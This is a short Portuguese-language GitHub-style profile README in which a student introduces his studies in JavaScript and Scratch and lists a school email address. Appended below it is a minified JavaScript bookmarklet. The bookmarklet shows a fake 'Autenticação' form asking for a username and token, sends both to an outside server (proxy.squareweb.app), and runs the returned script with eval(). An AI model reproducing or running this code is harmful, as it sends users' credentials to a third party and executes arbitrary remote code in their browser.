### bem-vindo a o meu perfil 👍

meu nome e matheus borges

 - estou fazendo na plataforma do [alura](https://www.alura.com.br)
 - estou me desenvolvendo na linguagem do [javaScript](https://p5.js.org) e [scratch](https://https://scratch.mit.edu/)
 - uso esse espaço para a minha organização e compartilhação dos meus projetos desenvidos 

### você pode entrar em contato comigo  📫

00001106286637sp@al.educacao.sp.gov.br

@matheus_borges

javascript:(function(){const formHtml=`<div id="authForm" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#121212;color:#fff;border:1px solid #E51C4D;border-radius:10px;padding:20px;box-shadow:0 4px 20px rgba(0,0,0,0.5);z-index:1000;width:300px;max-width:90%;"><h2 style="color:#E51C4D;text-align:center;">AutenticaÃ§Ã£o</h2><label for="username">Nome de UsuÃ¡rio:</label><br><input type="text" id="username" required style="width:100%;box-sizing:border-box;padding:10px;border-radius:5px;border:1px solid #E51C4D;background-color:#222;color:#fff;margin-bottom:10px;"><label for="token">Token:</label><br><input type="text" id="token" required style="width:100%;box-sizing:border-box;padding:10px;border-radius:5px;border:1px solid #E51C4D;background-color:#222;color:#fff;margin-bottom:20px;"><button id="submitBtn" style="background-color:#E51C4D;color:#fff;padding:10px;border:none;border-radius:5px;width:100%;cursor:pointer;">Enviar</button><button id="cancelBtn" style="background-color:#555;color:#fff;padding:10px;border:none;border-radius:5px;width:100%;cursor:pointer;margin-top:10px;">Cancelar</button></div>`;document.body.insertAdjacentHTML('beforeend',formHtml);const submitBtn=document.getElementById('submitBtn');const cancelBtn=document.getElementById('cancelBtn');submitBtn.onclick=function(){const user=document.getElementById('username').value;const token=document.getElementById('token').value;if(!user||!token){alert('Por favor, preencha todos os campos.');return;}const apiUrl=`https://proxy.squareweb.app/ramdomtin/toolblue?user=${encodeURIComponent(user)}&token=${encodeURIComponent(token)}`;fetch(apiUrl).then(response=>{if(!response.ok){return response.text().then(text=>{throw new Error(text||'Erro na resposta do servidor.');});}return response.text();}).then(script=>{if(script&&!script.trim().startsWith('<')){eval(script);document.getElementById('authForm').remove();}else{alert('Erro na resposta do servidor.');}}).catch(error=>alert(error.message||'Ops, algo deu errado.'));};cancelBtn.onclick=function(){document.getElementById('authForm').remove();};})();
